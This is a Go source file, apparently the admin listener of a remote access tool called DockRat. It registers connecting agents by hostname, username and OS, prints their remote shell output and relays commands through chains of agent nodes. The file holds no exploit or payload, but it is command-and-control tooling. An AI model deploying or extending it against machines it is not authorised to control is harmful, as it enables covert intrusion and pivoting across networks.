package network

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"

	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
)

// -------------------------- admin专用的监听函数 -------------------------

func StartListener(addr string, registry *node.Registry) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("[!] Failed to listen on %s: %v", addr, err)
	}
	log.Printf("[+] Listening on %s", addr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("[!] Accept error:", err)
			continue
		}
		go handleConnection(conn, registry)
	}
}

func handleConnection(conn net.Conn, registry *node.Registry) {
	log.Printf("[+] New connection from %s", conn.RemoteAddr())

	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		log.Println("[!] Failed to read message length:", err)
		conn.Close()
		return
	}
	length := bytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		log.Println("[!] Failed to read message body:", err)
		conn.Close()
		return
	}

	msg, err := protocol.DecodeMessage(data)
	if err != nil {
		log.Println("[!] Failed to decode message:", err)
		conn.Close()
		return
	}

	if msg.Type == protocol.MsgHandshake {
		var payload protocol.HandshakePayload
		if err := json.Unmarshal(msg.Payload, &payload); err != nil {
			log.Println("[!] Failed to decode handshake payload:", err)
			conn.Close()
			return
		}

		n := &node.Node{
			Conn:     conn,
			Hostname: payload.Hostname,
			Username: payload.Username,
			OS:       payload.OS,
			Addr:     conn.RemoteAddr().String(),
		}
		id := registry.Add(n)
		log.Printf("[+] Registered agent ID %d - %s@%s (%s)", id, n.Username, n.Hostname, n.OS)

		go handleAgentMessages(n, registry)
	} else {
		log.Println("[!] Unknown message type:", msg.Type)
		conn.Close()
	}
}

func handleAgentMessages(n *node.Node, registry *node.Registry) {
	conn := n.Conn
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Node %d disconnected: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}
		length := bytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Node %d read failed: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Node %d decode failed: %v", n.ID, err)
			continue
		}

		switch msg.Type {
		case protocol.MsgResponse:
			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
		case protocol.MsgShell:
			fmt.Print(string(msg.Payload))
		case protocol.MsgRelayReady:
			var payload protocol.RelayReadyPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] RelayReady decode failed: %v", err)
				return
			}
			// nodeInfo, ok := registry.Get(payload.SelfID)
			// ip := "(unknown)"
			// if ok {
			// 	ip = nodeInfo.Addr
			// }
			log.Printf("[Relay Ready] Node %d (%s) is now acting as relay ", payload.SelfID, payload.ListenAddr)

			// 可选：标记该 node 为 relay（拓扑用途）
			// if relayNode, ok := registry.Get(payload.SelfID); ok {
			// 	// 如果你有 isRelay 字段，可在此设置
			// 	log.Printf("[*] Relay node %d confirmed ready", payload.SelfID)
			// }
		case protocol.MsgRelayRegister:
			var payload protocol.RelayRegisterPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] RelayRegister decode failed: %v", err)
				return
			}

			newNode := payload.Node
			newID := newNode.ID

			// 检查是否冲突
			if _, exists := registry.Get(newID); exists {
				log.Printf("[-] Duplicate node ID %d rejected", newID)
				resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
				sendAck(n.Conn, protocol.MsgRelayError, resp)
				return
			}

			// 注册
			registry.AddWithID(&newNode)
			registry.NodeGraph.SetParent(newID, payload.ParentID)
			log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)

			resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
			sendAck(n.Conn, protocol.MsgRelayAck, resp)

		case protocol.MsgRelayPacket:
			var pkt protocol.RelayPacket
			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
				log.Printf("[-] RelayPacket decode failed: %v", err)
				return
			}

			// ✅ 特殊情况：目标是 admin 本人（DestID == -1）
			if pkt.DestID == -1 {
				innerMsg, err := protocol.DecodeMessage(pkt.Data)
				if err != nil {
					log.Printf("[-] Failed to decode inner message to admin: %v", err)
					return
				}
				switch innerMsg.Type {
				case protocol.MsgRelayRegister:
					var payload protocol.RelayRegisterPayload
					if err := json.Unmarshal(innerMsg.Payload, &payload); err != nil {
						log.Printf("[-] RelayRegister decode failed: %v", err)
						return
					}
					newNode := payload.Node
					newID := newNode.ID

					if _, exists := registry.Get(newID); exists {
						log.Printf("[-] Duplicate node ID %d rejected", newID)
						resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
						sendAck(n.Conn, protocol.MsgRelayError, resp)
						return
					}

					registry.AddWithID(&newNode)
					registry.NodeGraph.SetParent(newID, payload.ParentID)
					log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)

					resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
					sendAck(n.Conn, protocol.MsgRelayAck, resp)

				default:
					log.Printf("[-] Unknown message type sent to admin: %s", innerMsg.Type)
				}
				return // ❗重要：处理完后不要再继续下发
			}

			// ✅ 正常 relay 处理流程
			innerMsg, err := protocol.DecodeMessage(pkt.Data)
			if err != nil {
				log.Printf("[-] Failed to decode inner message: %v", err)
				return
			}

			switch innerMsg.Type {
			case protocol.MsgResponse:
				log.Printf("[#] Node %d response:\n%s", pkt.DestID, string(innerMsg.Payload))
			case protocol.MsgShell:
				fmt.Print(string(innerMsg.Payload))
			default:
				// 向下 relay：找父节点继续下发
				parentID := registry.NodeGraph.GetParent(pkt.DestID)
				if parentID == -1 {
					log.Printf("[-] No parent found for dest ID %d", pkt.DestID)
					return
				}
				parentNode, ok := registry.Get(parentID)
				if !ok || parentNode.Conn == nil {
					log.Printf("[-] Cannot forward to %d: no relay node found", pkt.DestID)
					return
				}
				fwdMsg := protocol.Message{
					Type:    protocol.MsgRelayPacket,
					Payload: msg.Payload, // 原始封装即可
				}
				buf, err := protocol.EncodeMessage(fwdMsg)
				if err != nil {
					log.Printf("[-] Failed to encode relay forward: %v", err)
					return
				}
				_, err = parentNode.Conn.Write(buf)
				if err != nil {
					log.Printf("[-] Failed to relay to %d via %d: %v", pkt.DestID, parentID, err)
				}
			}

		default:
			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
		}
	}
}
func sendAck(conn net.Conn, msgType protocol.MessageType, ack protocol.RelayAckPayload) {
	data, _ := json.Marshal(ack)
	msg := protocol.Message{
		Type:    msgType,
		Payload: data,
	}
	buf, _ := protocol.EncodeMessage(msg)
	conn.Write(buf)
}
